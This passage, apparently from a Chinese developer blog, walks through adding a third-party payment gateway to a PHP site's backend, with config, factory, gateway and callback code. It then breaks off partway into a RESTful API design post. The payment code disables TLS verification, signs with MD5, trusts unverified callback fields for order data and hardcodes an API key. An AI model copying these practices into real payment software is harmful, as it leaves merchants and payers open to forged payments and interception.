    <content type="text"><![CDATA[前言突然有一天老板扔给我一个错误百出的文档（文档不规范，码农两行泪），让我往某不知名网站添加某不可描述支付 分析 登录后台发现有添加第三方支付的菜单，但是发现只能更改配置，无法添加新的支付方式（知道不会这么简单） 进入数据库发现数据存储在payment_config表中，试着直接数据库添加查看数据变化，添加后发现只能出现在支付列表中，无法添加和更改配置 查看页面请求，直接阅读获取支付代码，发现有一个pay.json的配置文件，直接打开，部分代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162[ &#123; "nid": "nid_pay", "name": "请选择类型", "merchantID": "支付平台提供给商家的账号", "terminalID": "支付平台提供给商家的终端号", "merchantKey": "支付平台提供个商家的密码（MD5加密时使用）", "merchantPayKey": "支付有关的其他秘钥或信息", "partnerId": "支付平台代理商账号", "merchantPrivateKey": "用户私钥（与用户公钥成对存在）", "merchantPublicKey": "用户公钥（与用户私钥成对存在）", "platformPublicKey": "平台公钥（平台提供，一般在商户登录支付平台后台管理页面获取）", "merchantCertPath": "商家证书", "platformCertPath": "平台证书", "payBank": [&#123;"bank_id":1,"code":"ICBC"&#125;,&#123;"bank_id":2,"code":"ABC"&#125;,&#123;"bank_id":9,"code":"BOC"&#125;,&#123;"bank_id":7,"code":"CCB"&#125;, &#123;"bank_id":10,"code":"COMM"&#125;,&#123;"bank_id":11,"code":"CMB"&#125;,&#123;"bank_id":14,"code":"SPDB"&#125;,&#123;"bank_id":26,"code":"CIB"&#125;, &#123;"bank_id":15,"code":"CMBC"&#125;,&#123;"bank_id":13,"code":"GDB"&#125;,&#123;"bank_id":12,"code":"SPDB"&#125;,&#123;"bank_id":8,"code":"CEB"&#125;, &#123;"bank_id":29,"code":"HXB"&#125;,&#123;"bank_id":3,"code":"PSBC"&#125;,&#123;"bank_id":6,"code":"PAB"&#125; ], "pay_layers": "1,2,3,5,4,6,7,8,9,10,11", "payType": [ &#123;"id": 1,"name":"微信扫码支付","payStr":"支付配置信息","typeStr":"其他支付配置信息","payEntrance":"端口类型：1=ios,2=android,3=h5,4=pc","payStatus":"是否启用：1:启用;2:禁用","request_type":"返回数据or跳转页面：1：返回数据，2:跳转页面"&#125;, &#123;"id": 2,"name":"微信WAP支付","payStr":"WX_WAP","typeStr":"","payEntrance":"1,2,3,4","payStatus":1,"request_type":2&#125;, &#123;"id": 3,"name":"微信H5支付","payStr":"WX_H5","typeStr":"","payEntrance":"1,2,3,4","payStatus":1,"request_type":2&#125;, &#123;"id": 4,"name":"支付宝扫码支付","payStr":"ALI","typeStr":"","payEntrance":"1,2,3,4","payStatus":1,"request_type":1&#125;, &#123;"id": 5,"name":"支付宝WAP支付","payStr":"ALI_WAP","typeStr":"","payEntrance":"1,2,3,4","payStatus":1,"request_type":2&#125;, &#123;"id": 6,"name":"支付宝H5支付","payStr":"ALI_H5","typeStr":"","payEntrance":"1,2,3,4","payStatus":1,"request_type":2&#125;, &#123;"id": 7,"name":"QQ钱包扫码支付","payStr":"QQ","typeStr":"","payEntrance":"1,2,3,4","payStatus":1,"request_type":1&#125;, &#123;"id": 8,"name":"QQ钱包WAP支付","payStr":"QQ_WAP","typeStr":"","payEntrance":"1,2,3,4","payStatus":1,"request_type":2&#125;, &#123;"id": 9,"name":"QQ钱包H5支付","payStr":"QQ_H5","typeStr":"","payEntrance":"1,2,3,4","payStatus":1,"request_type":2&#125;, &#123;"id": 10,"name":"网银支付","payStr":"WY","typeStr":"","payEntrance":"1,2,3,4","payStatus":1,"request_type":2&#125;, &#123;"id": 11,"name":"网银H5支付","payStr":"WY_H5","typeStr":"","payEntrance":"1,2,3,4","payStatus":1,"request_type":2&#125;, &#123;"id": 12,"name":"网银快捷支付","payStr":"WY_KJ","typeStr":"","payEntrance":"1,2,3,4","payStatus":1,"request_type":2&#125;, &#123;"id": 13,"name":"京东钱包扫码支付","payStr":"JD","typeStr":"","payEntrance":"1,2,3,4","payStatus":1,"request_type":1&#125;, &#123;"id": 14,"name":"京东钱包WAP支付","payStr":"JD_WAP","typeStr":"","payEntrance":"1,2,3,4","payStatus":1,"request_type":2&#125;, &#123;"id": 15,"name":"京东钱包H5支付","payStr":"JD_H5","typeStr":"","payEntrance":"1,2,3,4","payStatus":1,"request_type":2&#125;, &#123;"id": 16,"name":"银联钱包扫码支付","payStr":"UN","typeStr":"","payEntrance":"1,2,3,4","payStatus":1,"request_type":1&#125;, &#123;"id": 17,"name":"银联钱包WAP支付","payStr":"UN_WAP","typeStr":"","payEntrance":"1,2,3,4","payStatus":1,"request_type":2&#125;, &#123;"id": 18,"name":"银联钱包H5支付","payStr":"UN_H5","typeStr":"","payEntrance":"1,2,3,4","payStatus":1,"request_type":2&#125;, &#123;"id": 19,"name":"网关支付扫码","payStr":"gateway","typeStr":"","payEntrance":"1,2,3,4","payStatus":1,"request_type":2&#125;, &#123;"id": 20,"name":"微信公众账号","payStr":"weixinjsapi","typeStr":"","payEntrance":"1,2,3,4","payStatus":1,"request_type":1&#125;, &#123;"id": 21,"name":"支付宝服务窗支付","payStr":"weixinjsapi","typeStr":"","payEntrance":"1,2,3,4","payStatus":1,"request_type":1&#125;, &#123;"id": 22,"name":"支付宝app支付","payStr":"alipayapp","typeStr":"","payEntrance":"1,2,3,4","payStatus":1,"request_type":1&#125;, &#123;"id": 23,"name":"苏宁扫码支付","payStr":"suning","typeStr":"","payEntrance":"1,2,3,4","payStatus":1,"request_type":1&#125; ], "sort": 0 &#125;, &#123; "nid": "hua_yin_pay", "name": "华银", "merchantID": "", "merchantPrivateKey": "", "merchantPublicKey": "", "platformPublicKey": "", "payType": [ &#123;"id": 1,"name":"微信扫码支付","payStr":"weixin_scan","payEntrance":"1,2,3,4","payStatus":1,"request_type":1&#125;, &#123;"id": 4,"name":"支付宝扫码支付","payStr":"alipay_scan","payEntrance":"1,2,3,4","payStatus":1,"request_type":1&#125;, &#123;"id": 7,"name":"QQ钱包宝扫码支付","payStr":"tenpay_scan","payEntrance":"1,2,3,4","payStatus":1,"request_type":1&#125;, &#123;"id": 10,"name":"网银支付","payStr":"direct_pay","payEntrance":"1,2,3,4","payStatus":1,"request_type":2&#125; ] &#125;,] 思路已经清晰了，直接从文件中添加了一个新的支付配置，果然后台支付列表中出现了，添加上该支付的配置参数 添加后，发起支付，报无此支付方式的错误，直接在代码中搜索这个错误信息，找到这个PayFactory.php工厂类，部分代码如下 123456789101112131415161718192021222324&lt;?php/** * Created by Kevin. * @author kevin * @copyright HCHT 2017/9/15 17:06 * @description 支付工厂类 */include_cache(S_CORE . 'class' . DS . 'pay' . DS . 'chengyi.php');class PayFactory&#123; public function getInterface($payMent) &#123; switch ($payMent) &#123; case 'cheng_yi_pay': return new cheng_yi_pay(); break; default: ErrorCode::errorResponse(200015, '线上支付方式不存在'); &#125; &#125;&#125; 思路已经很明朗了，创建一个支付类，添加上case分支 随便打开一个支付类，根据它的部分逻辑，接入新的支付逻辑，处理异步回调时，发现有两个回调可供选择，一个在recharge.php中，一个在根目录下的rechargeNotify.php中，同步回调在根目录下beeePayOk.php，具体可阅读代码，没有必要张贴 实现具体的支付类代码，仅供参考，每个支付的具体实现都有差别 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530&lt;?php/** * @description 诚意支付 */include_cache(S_CORE . 'class' . DS . 'pay' . DS . 'payinfo' . '.php');class ChengYiPay extends PayInfo&#123; //请求接口Url public $url = 'https://pay.chenyipay.com/api/pay/v2'; //接口名称 public $payName = '诚意支付'; //获取支付返回数据格式 public $retArr = [ //支付信息返回格式 'code' =&gt; 1, //0:数据获取成功，其他数字，数据获取失败 'msg' =&gt; '', //返回的提示信息 'data' =&gt; [] //返回数据 ]; //回调处理返回数据格式 public $orderInfo = [ //异步验签结果返回格式 'code' =&gt; 0, //0：数据获取成功，其他数字，数据获取失败 'bank_num' =&gt; 219050, //银行区分号（不同支付的前三位不同） 'order_no' =&gt; '', //后台数据库支付订单号 'amount' =&gt; 0, //支付金额 'ret_error' =&gt; 0, //回调处理失败时，返回接口字符串 'ret_success' =&gt; 'ok', //回调处理成功时，返回接口字符串 'bank_name' =&gt; '诚意支付', //支付方式名称 'serial_no' =&gt; '' //第三方回调返回的第三方支付订单号（支付流水号） ]; /** * 构成函数 */ public function __construct() &#123; parent::__construct(); &#125; /** * 调用第三方支付接口，获取支付信息 * @param array $data 前端返回信息，payment_id，支付类型ID，config，支付类型配置信息 * &#123;@inheritDoc&#125; * @see PayInfo::doPay() * @return $this-&gt;$retArr; */ public function doPay($data) &#123; //生成订单 $orderInfo = $this-&gt;makeOrder($data); if (!$orderInfo) &#123; $this-&gt;retArr['code'] = 219000; $this-&gt;retArr['msg'] = '支付订单生成失败'; payLog('payerror.log', '（' . $this-&gt;retArr['code'] . '）' . $this-&gt;payName . '订单生成失败，' . print_r($data, true)); return $this-&gt;retArr; &#125; //获取配置支付信息 $config = unserialize($data['config']); $callbackurl = $config['callbackurl']?$config['callbackurl']:$_SERVER['HTTP_HOST']; if (empty($data['pay_type']) || empty($config['payType'][$data['pay_type']])) &#123; $this-&gt;retArr['code'] = 219001; $this-&gt;retArr['msg'] = '支付银行类型不存在'; payLog('payerror.log', '（' . $this-&gt;retArr['code'] . '）' . $this-&gt;payName . '银行类型不存在，' . print_r($data, true)); return $this-&gt;retArr; &#125; $postData = [ 'p1_mchtid' =&gt; $config['merchantID'], 'p2_paytype' =&gt; $config['payType'][$data['pay_type']]['payStr'], 'p3_paymoney' =&gt; $data['money'], 'p4_orderno' =&gt; $orderInfo, //异步 'p5_callbackurl' =&gt; "http://".$callbackurl."/?m=api&amp;c=recharge&amp;a=rechargeNotify&amp;payment_id=" . $data['payment_id'], //同步 'p6_notifyurl' =&gt; "http://".$callbackurl."/beeePayOk.php", 'p7_version' =&gt; 'v2.9', 'p8_signtype' =&gt; '2', 'p9_attach' =&gt; 'chengyi_' . $data['payment_id'], 'p10_appname' =&gt; '', 'p11_isshow' =&gt; '0', 'p12_orderip' =&gt; ip(), 'p13_memberid' =&gt; $data['user_id'], ]; payLog('chengyi.txt',print_r($postData,true)); //待签名字符串 $signStr = $this-&gt;get_sign($postData); //生成签名 $postData["sign"] = md5($signStr.$config['merchantKey']); //转为json字符串 $jsonStr = json_encode($postData); //获取公钥 $publicKey = $this-&gt;publicKeyStr($config['merchantPublicKey']); //公钥加密 $reqdata = urlencode($this-&gt;publicEncrypt($publicKey, $jsonStr)); //请求参数 $signData["mchtid"] = $config['merchantID']; $signData["reqdata"] = $reqdata; //判断支付网关是否是wap if ($config['payType'][$data['pay_type']]['request_type'] == 2) &#123; $retData = [ 'type' =&gt; $config['payType'][$data['pay_type']]['request_type'], 'modes' =&gt; $data['pay_model'], 'html' =&gt; $this-&gt;paramToHtmlForm($this-&gt;url, $signData) ]; $this-&gt;retArr['code'] = 0; $this-&gt;retArr['data'] = $retData; return $this-&gt;retArr; &#125; //发起请求 $result = $this-&gt;httpRequest($this-&gt;url, json_encode($signData)); //将json字符串转为数组 $resultArr = json_decode($result,true); //判断返回信息 if ($resultArr['rspCode'] != 1 &amp;&amp; !$resultArr['data']) &#123; $this-&gt;retArr['code'] = 219002; $this-&gt;retArr['msg'] = '支付二维码生成失败！'; payLog('payerror.log', '（' . $this-&gt;retArr['code'] . '）' . $this-&gt;payName . $resultArr["rspMsg"] . print_r($resultArr, true)); return $this-&gt;retArr; &#125; $resultData = $resultArr['data']; //验签 $re = $this-&gt;payVerify($resultData, $config['merchantKey']); if (!$re) &#123; $this-&gt;retArr['code'] = 219003; $this-&gt;retArr['msg'] = '支付二维码生成失败！'; payLog('payerror.log', '（' . $this-&gt;retArr['code'] . '）' . $this-&gt;payName . '验签失败' . print_r($resultArr, true)); return $this-&gt;retArr; &#125; payLog('chengyi.txt',print_r($resultData, true). "===134"); $retOderNo = $orderInfo; $retOderPayNo = isset($resultData['r2_systemorderno']) ? $resultData['r2_systemorderno'] : 'chengyipay' . date('YmdHis'); $retOderPayQrcodrUrl = isset($resultData['r6_qrcode']) ? $resultData['r6_qrcode'] : ''; $result = D('accountRecharge')-&gt;getOneCoupon('id', array('order_sn' =&gt; $retOderNo, 'status' =&gt; 0)); if (empty($result)) &#123; $this-&gt;retArr['code'] = 219004; $this-&gt;retArr['msg'] = '支付二维码生成失败！'; payLog('payerror.log', '（' . $this-&gt;retArr['code'] . '）' . $this-&gt;payName . '返回数据成功,但订单表没有查到相应未完成的订单号，' . print_r($resultArr, true)); return $this-&gt;retArr; &#125; D('accountRecharge')-&gt;save(['remark' =&gt; $retOderPayNo], ['order_sn' =&gt; $retOderNo]); // 用于安全验证返回url是否非法 $shortQrcodrUrl =$this-&gt;shortUrl($retOderPayQrcodrUrl, '5cf1028991d2c405942b1569@f15436319999938d84e5f8b7d25e9dda'); if (!$shortQrcodrUrl) &#123; $this-&gt;retArr['code'] = 219005; $this-&gt;retArr['msg'] = '支付二维码生成失败！'; payLog('payerror.log', '（' . $this-&gt;retArr['code'] . '）' . $this-&gt;payName . '二维码获取成功，但转换短链接失败' . print_r($resultArr, true)); return $this-&gt;retArr; &#125; session::set('qrcode_url', $shortQrcodrUrl); session::set('pay_url', ''); //type =1 返回二维码数据 $ret = [ 'type' =&gt; $config['payType'][$data['pay_type']]['request_type'], 'code_url' =&gt; $shortQrcodrUrl, 'pay_url' =&gt; '', 'order_no' =&gt; $orderInfo, 'modes' =&gt; $data['pay_model'] ]; $this-&gt;retArr['code'] = 0; $this-&gt;retArr['data'] = $ret; return $this-&gt;retArr; &#125; /** * 支付回调处理 * @param array $postData data：回调返回的数据，payment_Id：支付类型ID * &#123;@inheritDoc&#125; * @see PayInfo::doPaycallBack() * @return array $this-&gt;$retArr; */ public function doPaycallBack($postData) &#123; //接收回调后 返回 ok; echo 'ok'; //处理post回调数据 $data = json_decode($postData['data'], true); $reqdata = $data['reqdata']; $config = unserialize($postData['config']); payLog('chengyi.txt',print_r($postData, true).'----996--'); //判断字符串是否需要 urldecode解 if (strpos($reqdata, '%')) &#123; $reqdata = urldecode($reqdata); &#125; if (!is_array($config)) &#123; $this-&gt;orderInfo['code'] = 219020; payLog('payerror.log', '（' . $this-&gt;orderInfo['code'] . '）支付异步通知,获取数据库配置错误！' . print_r($data, true)); return $this-&gt;orderInfo; &#125; if (!$reqdata) &#123; $this-&gt;orderInfo['code'] = 219021; payLog('payerror.log', '（' . $this-&gt;orderInfo['code'] . '）支付异步通知:获取重要参数错误！' . print_r($data, true)); return $this-&gt;orderInfo; &#125; //获取私钥 $private_key = $this-&gt;privateKeyStr($config['merchantPrivateKey']); //解密 $dataJson = $this-&gt;privateDecrypt($reqdata, $private_key); if (!$dataJson) &#123; $this-&gt;orderInfo['code'] = 219022; payLog('payerror.log', '（' . $this-&gt;orderInfo['code'] . '）支付异步通知：支付解密失败！' . print_r($data, true)); return $this-&gt;orderInfo; &#125; $arr = json_decode($dataJson, true); $arr['partner'] = $config['merchantID']; //去除不需要参入验签的字段 unset($arr["sysnumber"]); unset($arr["attach"]); //验证签名 $re = $this-&gt;payVerify($arr, $config['merchantKey']); if (!$re) &#123; $this-&gt;orderInfo['code'] = 219023; payLog('payerror.log', '（' . $this-&gt;orderInfo['code'] . '）支付异步通知：验签失败！' . print_r($arr, true)); return $this-&gt;orderInfo; &#125; if (!isset($arr['orderstatus']) || $arr['orderstatus'] != 1 ) &#123; $this-&gt;orderInfo['code'] = 219024; payLog('payerror.log', '（' . $this-&gt;orderInfo['code'] . '）支付异步通知：支付失败！' . print_r($data, true)); return $this-&gt;orderInfo; &#125; $this-&gt;orderInfo['code'] = 0; $this-&gt;orderInfo['order_no'] = $data['ordernumber']; $this-&gt;orderInfo['amount'] = $data['paymoney']; $this-&gt;orderInfo['serial_no'] = $data['sysnumber']; return $this-&gt;orderInfo; &#125; /** * [get_sign 拼接签名字符串] * @param [type] $arr 数组 * @return [type] [description] */ public function get_sign($arr) &#123; $signmd5=""; foreach($arr as $x=&gt;$x_value) &#123; if($signmd5=="")&#123; $signmd5 =$signmd5.$x .'='. $x_value; &#125;else&#123; $signmd5 = $signmd5.'&amp;'.$x .'='. $x_value; &#125; &#125; return $signmd5; &#125; /** * [publicKeyStr 公钥字符串处理] * @param [type] $publicStr 公钥字符串 * @return [type] [description] */ public function publicKeyStr($publicStr) &#123; $public_key = "-----BEGIN PUBLIC KEY-----\r\n"; foreach (str_split($publicStr,64) as $str)&#123; $public_key .= $str . "\r\n"; &#125; $public_key .="-----END PUBLIC KEY-----"; return $public_key; &#125; /** * [publicEncrypt 公钥加密] * @param [type] $publicKey 公钥 * @param [type] $data 加密字符串 * @return [type] [description] */ public function publicEncrypt($publicKey, $data) &#123; $key = openssl_get_publickey($publicKey); $original_arr = str_split($data,117); foreach($original_arr as $o) &#123; $sub_enc = null; openssl_public_encrypt($o,$sub_enc,$key); $original_enc_arr[] = $sub_enc; &#125; openssl_free_key($key); $original_enc_str = base64_encode(implode('',$original_enc_arr)); return $original_enc_str; &#125; /** * [paramToHtmlForm form表单方法] * @param [type] $url 请求URL * @param [type] $params 数组 请求参数 * @return [type] [description] */ public function paramToHtmlForm($url,$params) &#123; $def_url = "&lt;form id='form' name='payForm' action='".$url."' method='POST'&gt;\r"; foreach ($params as $key =&gt; $value) &#123; $def_url .="&lt;input type='hidden' name='".$key."' value='".$value."'&gt;\r"; &#125; $def_url .="&lt;input type='submit' value='确认提交'&gt;&lt;/form&gt;&lt;script language='javascript'&gt;window.onload=function()&#123;document.payForm.submit();&#125;&lt;/script&gt;"; return $def_url; &#125; /** * [httpRequest http请求] * @param [type] $url 请求URL * @param [type] $data 请求参数 json字符串 * @return [type] [description] */ public function httpRequest($url,$data) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST"); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)'); curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json','Content-Length: ' . strlen($data))); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_AUTOREFERER, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, $data); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $tmpInfo = curl_exec($ch); if (curl_errno($ch)) &#123; return curl_error($ch); &#125; return $tmpInfo; &#125; /** *[payVerify 支付付验签] * @param [type] $result [返回的参数] * @return [type] $md5 [MD5] */ public function payVerify($result,$md5) &#123; $signStr = $result['sign']; $sign_array = array(); foreach ($result as $k =&gt; $v) &#123; if ($k !== 'sign')&#123; $sign_array[$k] = $v; &#125; &#125; $sign = md5($this-&gt;get_sign($sign_array).$md5); if($signStr != $sign)&#123; return false; &#125; return true; &#125; function CurlQuery($url) &#123; //设置附加HTTP头 $addHead = array( "Content-type: application/json" ); $curl_obj = curl_init(); curl_setopt($curl_obj, CURLOPT_URL, $url); curl_setopt($curl_obj, CURLOPT_HTTPHEADER, $addHead); curl_setopt($curl_obj, CURLOPT_HEADER, 0); curl_setopt($curl_obj, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl_obj, CURLOPT_TIMEOUT, 15); $result = curl_exec($curl_obj); curl_close($curl_obj); return $result; &#125; //根据长网址获取短网址 function shortUrl($long_url, $appkey) &#123; $long_url = urlencode($long_url); $url = 'http://mrw.so/api.php?format=json&amp;url=' . $long_url . '&amp;key=' . $appkey . '&amp;expireDate=' . date("Y-m-d",strtotime("+3 day")); //获取请求结果 $result = $this-&gt;CurlQuery($url); $json = json_decode($result); //异常情况返回false if ($json-&gt;err) &#123; return false; &#125; return $json-&gt;url; &#125; /** * 提交表单数据 * @param array $post_data 表单提交数据 * @param string $url 表单提交接口 * @return string */ function httpHtml($post_data, $url) &#123; $html = '&lt;html&gt;'; $html = '&lt;head&gt;'; $html .= '&lt;meta http-equiv="Content-Type" content="text/html; charset=gb2312"&gt;'; $html .= '&lt;/head&gt;'; $html .= '&lt;body onLoad="document.dinpayForm.submit();"&gt;'; $html .= '&lt;form id="payFrom" name="dinpayForm" method="get" action="' . $url . '"&gt;'; foreach ($post_data as $key =&gt; $value) &#123; $html .= '&lt;input type="hidden" name="' . $key . '" value="' . $value . '"/&gt;'; &#125; $html .= '&lt;/form&gt;'; $html .= '&lt;/body&gt;'; $html .= '&lt;/html&gt;'; return $html; &#125; /** * 调用第三方接口，提交数据 * @param string $url 第三方接口url * @param array $postdata 提交数据 * @return array[]|mixed[] 返回数据 */ public function httpPost($data, $url, $path='') &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POSTFIELDS, $data); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_CAINFO, $path); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_HTTPHEADER,array('Content-Type: application/json; charset=utf-8','Content-Length:' . strlen($data))); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2); $response = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); return array('code' =&gt; $httpCode, 'data' =&gt; $response); &#125; /** * [privateKeyStr 私钥钥字符串处理] * @param [type] $privatekey [description] * @return [type] [description] */ public function privateKeyStr($privatekey) &#123; $private_key = "-----BEGIN PRIVATE KEY-----\r\n"; foreach (str_split($privatekey,64) as $str)&#123; $private_key .= $str . "\r\n"; &#125; $private_key .="-----END PRIVATE KEY-----"; return $private_key; &#125; /** * [decode 私钥解密] * @param [type] $data [待解密字符串] * @param [type] $privateKey [私钥] * @return [type] [description] */ public function privateDecrypt($data,$privateKey) &#123; //读取秘钥 $pr_key = openssl_pkey_get_private($privateKey); if ($pr_key == false)&#123; echo "打开密钥出错"; die; &#125; $data = base64_decode($data); $crypto = ''; //分段解密 foreach (str_split($data, 128) as $chunk) &#123; openssl_private_decrypt($chunk, $decryptData, $pr_key); $crypto .= $decryptData; &#125; return $crypto; &#125;&#125; rechargeNotify回调核心代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109&lt;?php/** * desc: 处理线上支付无参数路由支付回调处理方法：通过url调用执行该文件，获取相关支付确认信息后，通过curl转发到带参数路由的api接口 */define('S_ROOT', dirname(__FILE__) . DIRECTORY_SEPARATOR);//require S_ROOT . 'core' . DIRECTORY_SEPARATOR . 'base.php';$data = []; //支付回调数据$payData = ''; //支付回传的支付参数，规定：使用"_"将支付名称与支付ID连接起来，如兄弟支付：'xiongdi_123'$payType = ''; //支付类型$payment_id = ''; //支付方式ID//不同的支付方式获取数据的方式可能不同，根据不同的支付，添加不同的获取回调数据的方法，如：$_GET\$_POST\$_REQUEST\（php://input）$postData = file_get_contents("php://input"); //获取post参数字符串类型数据payLog('callbackRecharge.txt',print_r($postData,true).'---23---');//数据处理，不同的支付方式，可能数据处理方式不同if (!empty($postData)) &#123; if (!simplexml_load_string($postData, 'SimpleXMLElement', LIBXML_NOCDATA)) &#123; parse_str($postData, $data); &#125; else &#123; $data = json_decode(json_encode(simplexml_load_string($postData, 'SimpleXMLElement', LIBXML_NOCDATA)), true); &#125; payLog('callbackRecharge.txt',print_r($postData,true).'---20---' . print_r(simplexml_load_string($postData, 'SimpleXMLElement', LIBXML_NOCDATA),true));&#125; else &#123; $data = $_REQUEST;&#125;payLog('callbackRecharge.txt',print_r($data,true).'---26---');if (!empty($data)) &#123; payLog('callbackRecharge.txt', '异步充值接参数通知数据：' . print_r($data, true)); //日志，记录转接数据 if (isset($data['pay_attach'])) &#123; $payData = explode('_', $data['pay_attach']); &#125; if (empty($payData)) &#123; exit('0'); &#125; $payType = $payData[0] ?? ''; $payment_id = $payData[1] ?? '';&#125;if (!empty($data) &amp;&amp; !empty($payment_id)) &#123; payLog('curlRecharge.log', '异步充值url转接参数通知数据：' . print_r($data, true)); //日志，记录转接数据 $ret = httpPostApi($data, $payment_id); //异步充值通知转接 payLog('callbackRecharge.txt',print_r($ret,true).'----73--'); echo $ret; //输出结果数据&#125;/** * 充值异步转接接口调用，post数据转发，表单提交数据库格式 * @param array $payData 需要转发的数据 * @param int $paymentId 线上支付方式ID * @return mixed|number 返回数据 */function httpPostApi($payData, $paymentId)&#123; //路由api接口 $payUrl = "https://".$_SERVER['HTTP_HOST']."/?m=api&amp;c=recharge&amp;a=rechargeNotify&amp;payment_id=" . $paymentId; $ch = curl_init(); curl_setopt($ch,CURLOPT_URL, $payUrl); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_HEADER, false); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payData)); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $response=curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch); if ($httpCode == 200) &#123; return $response; &#125; else &#123; return 0; &#125;&#125;/** * 支付日志 * @param string $fileName 文件名,如：payerror.log或者pay/error.log * @param array $data 数据 */function payLog($fileName, $data)&#123; $pathLog = S_ROOT . 'caches' . DIRECTORY_SEPARATOR . 'log' . DIRECTORY_SEPARATOR . $fileName; if (is_file($pathLog)) &#123; if (filesize($pathLog) &gt;= 10000000) &#123; $new_file = dirname($pathLog) . '/' . date('Y_m_d_H_i_s').'_' . basename($pathLog); copy($pathLog,$new_file); file_put_contents($pathLog, '&lt;----' . date('Y-m-d H:i:s').'----&gt;' . $data . "\n"); &#125;else &#123; file_put_contents($pathLog, '&lt;----' . date('Y-m-d H:i:s').'----&gt;' . $data . "\n", FILE_APPEND); &#125; &#125;else &#123; file_put_contents($pathLog, '&lt;----' . date('Y-m-d H:i:s').'----&gt;' . $data . "\n", FILE_APPEND); &#125;&#125;]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RESETful API 设计规范]]></title>
    <url>%2F2019%2F6%2FRESETfulAPI%E8%AE%BE%E8%AE%A1%E8%A7%84%E8%8C%83%2F</url>
    <content type="text"><![CDATA[前言工欲善其事，必先利其器，一个健壮的API必要有优秀的设计规范，本文是最基本的设计理念 协议在通过 API 于后端服务通信的过程中，应该 使用 HTTPS 协议。 API Root URLAPI 的根入口点应尽可能保持足够简单，这里有两个常见的 URL 根例子： 12api.example.com/*example.com/api/* 如果你的应用很庞大或者你预计它将会变的很庞大，那 应该 将 API 放到子域下。这种做法可以保持某些规模化上的灵活性。 Versioning所有的 API 必须保持向后兼容，你 必须 在引入新版本 API 的同时确保旧版本 API 仍然可用。所以 应该 为其提供版本支持。 目前比较常见的两种版本号形式： 在 URL 中嵌入版本编号1api.example.com/v1/* 这种做法是版本号直观、易于调试；另一种做法是，将版本号放在 HTTP Header 头中：通过媒体类型来指定版本信息1Accept: application/vnd.example.com.v1+json 其中 vnd 表示 Standards Tree 标准树类型，有三个不同的树: x，prs 和 vnd。你使用的标准树需要取决于你开发的项目 未注册的树（x）主要表示本地和私有环境 私有树（prs）主要表示没有商业发布的项目 供应商树（vnd）主要表示公开发布的项目 后面几个参数依次为应用名称（一般为应用域名）、版本号、期望的返回格式。 Endpoints端点就是指向特定资源或资源集合的 URL。在端点的设计中，你 必须 遵守下列约定: URL 的命名 必须 全部小写 URL 中资源（resource）的命名 必须 是名词，并且 必须 是复数形式 必须 优先使用 Restful 类型的 URL URL 中不能出现 -，必须 用下划线 _ 代替 URL 必须 是易读的 URL 一定不可 暴露服务器架构 HTTP 动词对于资源的具体操作类型，由 HTTP 动词表示。常用的 HTTP 动词有下面五个（括号里是对应的 SQL 命令）。 GET（SELECT）：从服务器取出资源（一项或多项）。 POST（CREATE）：在服务器新建一个资源。 PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。 PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。 DELETE（DELETE）：从服务器删除资源。 Filtering 如果记录数量很多，服务器不可能都将它们返回给用户。API 应该 提供参数，过滤返回结果。下面是一些常见的参数。 ?limit=10：指定返回记录的数量 ?offset=10：指定返回记录的开始位置。 ?page=2&amp;per_page=100：指定第几页，以及每页的记录数。 ?sortby=name&amp;order=asc：指定返回结果按照哪个属性排序，以及排序顺序。 ?animal_type_id=1：指定筛选条件 所有 URL 参数 必须 是全小写，必须 使用下划线类型的参数形式。 经常使用的、复杂的查询 应该 标签化，降低维护成本。如 